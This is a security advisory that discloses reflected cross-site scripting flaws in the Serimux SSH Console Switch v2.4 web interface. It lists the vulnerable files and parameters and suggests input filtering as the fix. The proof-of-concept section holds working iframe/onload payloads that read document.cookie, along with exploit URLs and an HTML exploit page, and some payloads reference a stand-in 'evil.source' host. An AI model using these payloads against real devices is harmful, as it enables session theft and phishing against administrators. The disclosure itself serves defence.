
Date: Tue, 4 Oct 2016 14:20:13 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: Serimux SSH Console Switch v2.4 - Multiple Cross Site Vulnerabilities

Document Title:
===============
Serimux SSH Console Switch v2.4 - Multiple Cross Site Vulnerabilities


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=1942


Release Date:
=============
2016-10-04


Vulnerability Laboratory ID (VL-ID):
====================================
1942


Common Vulnerability Scoring System:
====================================
3.4


Product & Service Introduction:
===============================
SERIMUX-S-x - The SERIMUX Secure SSH Console Serial Switch delivers secure management of up to 32 serial 
devices via the internet, TCP/IP network, or dial-up modem connections. It combines the advanced security 
of Secure Shell v2 with unlimited access to remote network management.

(Copy of the Homepage: http://www.networktechinc.com/download/d-srvsw-term-ssh.html )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered multiple cross site vulnerabilities in the Serimux SSH Console Switch v2.4 application.


Vulnerability Disclosure Timeline:
==================================
2016-10-04:	Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Network Technologies Inc
Product: Serimux SSH Console Switch - GUI (Web-Application) 2.4


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
Multiple client-side cross site scripting vulnerabilities has been discovered in the Serimux SSH Console Switch v2.4 application.
Remote attackers are able to perform malicious client-side request to manipulate browser to web-application requests.

The client-side cross site scripting web vulnerabilities are located in the `PAGE`, `SECTION` and `PORTNUMBER` parameters of the 
`portconnect.asp`, `tcpsettings.asp`,`syslog.asp`,`portcnfiguration.asp` and `systeminfo.asp` files. The affected modules are 
`./nti/` and ./goform/. The request method to inject is GET and the attack vector is non-persistent. The cross site vulnerabilities 
allows to perform malicious client-side attacks to compromise user session credentials or affected web-application module context.

The security risk of the vulnerabilities are estimated as medium with a cvss (common vulnerability scoring system) count of 3.4. 
Exploitation of the client-side vulnerabilities requires no privileged web-application user account and only low user interaction. 
Successful exploitation of the vulnerability results in non-persistent phishing attacks, session hijacking, non-persistent 
external redirect to malicious sources and non-persistent manipulation of affected or connected web module context.

Request Method(s):
[+] GET

Vulnerable Module(s):
[+] ./goform/
[+] ./nti/

Vulnerable File(s):
[+] portconnect.asp
[+] tcpsettings.asp
[+] syslog.asp
[+] portconfiguration.asp
[+] systeminfo.asp

Vulnerable Parameter(s):
[+] PAGE
[+] PORTNUMBER
[+] SECTION

Affected Firmware:
[+] 2.4 (www.networktechinc.com/download/serimux-ssh-v2-4.tar.gz)
[+] 2.3 (www.networktechinc.com/download/serimux-ssh-v2-3.tar.gz)
[+] 2.2 (www.networktechinc.com/download/serimux-ssh-v2-2.tar.gz)
[+] 2.1 (www.networktechinc.com/download/serimux-ssh-v2-1.tar.gz)


Proof of Concept (PoC):
=======================
The cross site scripting web vulnerabilities can be exploited by remote attackers without user account and with low user interaction.
For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.


PoC: Payload(s)
>"<iframe>%20>"<iframe src=a onload=alert(document.cookie) <
>"<iframe>%20>"<iframe src=a onload=alert(document.domain) <


PoC: Exploitation (URL)
http://gui.localhost:8080/nti/portconnect.asp?PAGE=%3E%22%3Ciframe%3E%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.cookie)%20%3C
http://gui.localhost:8080/goform/Port?PORTNUMBER=1&SECTION=%3E%22%3Ciframe%3E%20%3E%22%3Ciframe%20src=a%20onload=alert(document.cookie)%20%3C
http://gui.localhost:8080/goform/Port?PORTNUMBER=%3E%22%3Ciframe%3E%20%3E%22%3Ciframe%20src=a%20onload=alert(document.cookie)%20%3C&SECTION=ShowNone
http://gui.localhost:8080/nti/tcpsettings.asp?PAGE=%3E%22%3Ciframe%3E%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.cookie)%20%3C
http://gui.localhost:8080/nti/syslog.asp?PAGE=%3E%22%3Ciframe%3E%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.cookie)%20%3C
http://gui.localhost:8080/nti/portconfiguration.asp?PAGE=%3E%22%3Ciframe%3E%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.cookie)%20%3C
http://gui.localhost:8080/nti/systeminfo.asp?PAGE=%3E%22%3Ciframe%3E%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.cookie)%20%3C


PoC: Exploit Code
<html>
<head><body>
<title>PoC: Multiple Client Side Cross Site Vulnerabilities - SERIMUX SSH CONSOLE SWITCH v2.4</title>
<img src="http://gui.localhost:8080/nti/portconnect.asp?PAGE=%3E%22%3Ciframe%3E%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.cookie)%20%3C">
<img src="http://gui.localhost:8080/goform/Port?PORTNUMBER=1&SECTION=%3E%22%3Ciframe%3E%20%3E%22%3Ciframe%20src=a%20onload=alert(document.cookie)%20%3C">
<img src="http://gui.localhost:8080/goform/Port?PORTNUMBER=%3E%22%3Ciframe%3E%20%3E%22%3Ciframe%20src=a%20onload=alert(document.cookie)%20%3C&SECTION=ShowNone">
<img src="http://gui.localhost:8080/nti/tcpsettings.asp?PAGE=%3E%22%3Ciframe%3E%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.cookie)%20%3C">
<img src="http://gui.localhost:8080/nti/syslog.asp?PAGE=%3E%22%3Ciframe%3E%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.cookie)%20%3C">
<img src="http://gui.localhost:8080/nti/portconfiguration.asp?PAGE=%3E%22%3Ciframe%3E%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.cookie)%20%3C">
<img src="http://gui.localhost:8080/nti/systeminfo.asp?PAGE=%3E%22%3Ciframe%3E%3E%22%3Ciframe%20src=evil.source%20onload=alert(document.cookie)%20%3C">
</body></head>
</html>


Reference(s):
http://gui.localhost:8080/
http://gui.localhost:8080/nti/
http://gui.localhost:8080/nti/syslog.asp
http://gui.localhost:8080/nti/systeminfo.asp
http://gui.localhost:8080/nti/portconnect.asp
http://gui.localhost:8080/nti/tcpsettings.asp
http://gui.localhost:8080/nti/portconfiguration.asp


Solution - Fix & Patch:
=======================
The cross site scripting vulnerabilties can be patched by an input restriction of the vulnerable parameters, 
disallow the usage of special chars on input to prevent further injection attacks. Parse all parameters separatly 
to resolve the issue.


Security Risk:
==============
The security risk of the client-side cross site scripting vulnerabilities are estimated as medium. (CVSS 3.4)


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.)


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, 
deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com
Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php

Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark 
of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get a ask permission.

				    Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™


-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com


